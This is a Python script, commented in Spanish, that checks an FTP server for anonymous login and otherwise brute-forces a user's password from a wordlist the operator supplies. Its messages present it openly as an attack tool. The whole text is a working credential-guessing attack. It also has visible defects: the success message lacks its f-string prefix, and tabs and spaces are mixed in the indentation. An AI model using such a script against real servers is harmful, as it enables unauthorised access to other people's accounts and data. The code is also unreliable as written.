from ftplib import FTP



host = input("Introduce la IP del FTP a bichear: ")

username = input("Introduce el nombre de usuario: ")

passwordlist = input("Introduce el nombre o el path de lista de palabras clave: ")

def check_anon_login(host):    #Función para testear si existe usuario anonymous
    
    try:

        with FTP(host) as ftp:

        	ftp.login()     #Probamos las credenciales

            # Si el servidor permite usuario anonymous devuelve True, sino devuelve False.
        	return True

    except:

    	return False

 #Creamos la función base

def ftp_buster(host, username, passwordlist):

	#Abre la lista de contraseñas y las lee

	with open(passwordlist, "r") as passwd_file:

		#Prueba las contraseñas una por una

	    for password in passwd_file.readlines():

	    	password = password.strip()

	    	with FTP(host = host, timeout = 0.2) as ftp:

	    		try:
	    			ftp.login(user = username, passwd = password)
	    			print("Encontraste lo que buscabas: {password}")
	    			break

	    		except Exception as e:

	    			print(f"Probando la palabra: {password}")

	    			continue


if check_anon_login(host = host):

	print("Tiene usuario anónimo, me encanta que los planes salgan bien")

else:

	print("El usuario anonymous no cuela, vamos a probar cosas malas")

	ftp_buster(host = host, username = username, passwordlist = passwordlist)

